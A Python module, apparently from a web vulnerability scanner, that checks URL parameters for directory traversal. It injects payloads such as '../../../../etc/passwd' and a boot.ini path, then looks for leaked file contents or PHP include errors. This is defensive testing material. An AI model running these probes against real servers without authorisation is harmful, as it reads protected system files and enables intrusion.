from urllib.parse import urlparse, urlunparse
from utils.http_client import HttpClient
from utils.reporter import Reporter

class TraversalScanner:
    def __init__(self, http_client: HttpClient, reporter: Reporter):
        self.client = http_client
        self.reporter = reporter
        self.SUSPICIOUS_PARAMS = {'page', 'file', 'path', 'document', 'view', 'cat', 'dir', 'action', 'board', 'date', 'download', 'image'}

        #Payloads mapped to verification strings for confirmed vulnerabilities
        self.SUCCESS_PAYLOADS = {
            "../../../../etc/passwd": "root:x:0:0",
            "..\\..\\..\\..\\boot.ini": "[boot loader]"
        }

        #Error messages that strongly indicate a vulnerability
        self.ERROR_STRINGS = [
            "open_basedir restriction in effect",
            "failed to open stream: operation not permitted",
            "failed to open stream: no such file or directory",
            "include_path",
            "failed opening required"
        ]
        self.vulnerable_findings = []

    def _test_parameter(self, url, param_to_test):
        """Injects traversal payloads"""

        all_payloads = list(self.SUCCESS_PAYLOADS.keys())

        for payload in all_payloads:
            parsed_url = urlparse(url)
            query_params = parsed_url.query.split('&')
            new_query_parts = []
            for param_pair in query_params:
                name, value = param_pair.split('=', 1)
                if name == param_to_test:
                    new_query_parts.append(f"{name}={payload}")
                else:
                    new_query_parts.append(param_pair)

            new_query = "&".join(new_query_parts)
            attack_url = urlunparse(parsed_url._replace(query=new_query))

            try:
                response = self.client.get(attack_url)
                if not response:
                    continue

                response_text = response.text.lower()

                #Check for definitive proof (file content)
                if payload in self.SUCCESS_PAYLOADS and self.SUCCESS_PAYLOADS[payload] in response_text:
                    finding = {"type": "Confirmed", "url": url, "parameter": param_to_test, "payload": payload}
                    if finding not in self.vulnerable_findings:
                        self.vulnerable_findings.append(finding)
                        self.reporter.log_raw('traversal_scanner', finding)
                    return

                #If no definitive proof, check for indicative error messages
                for error in self.ERROR_STRINGS:
                    if error in response_text:
                        finding = {"type": "Potential (Error-Based)", "url": url, "parameter": param_to_test,
                                   "payload": payload}
                        if finding not in self.vulnerable_findings:
                            self.vulnerable_findings.append(finding)
                            self.reporter.log_raw('traversal_scanner', finding)
                        return
            except Exception:
                pass

    def scan(self, url):
        """Scans URL for Directory Traversal vulnerabilities."""
        print(f"[*] Starting Directory Traversal scan for {url}...")
        parsed_url = urlparse(url)

        if not parsed_url.query:
            print("[-] No URL parameters found to test.")
            return []

        params_to_test = set()
        for param_pair in parsed_url.query.split('&'):
            if '=' in param_pair:
                name = param_pair.split('=', 1)[0]
                if name in self.SUSPICIOUS_PARAMS:
                    params_to_test.add(name)

        if not params_to_test:
            print(f"[-] No suspicious parameters found in URL.")
            return []

        for param in params_to_test:
            print(f"[*] Testing suspicious parameter '{param}'...")
            self._test_parameter(url, param)

        return self.vulnerable_findings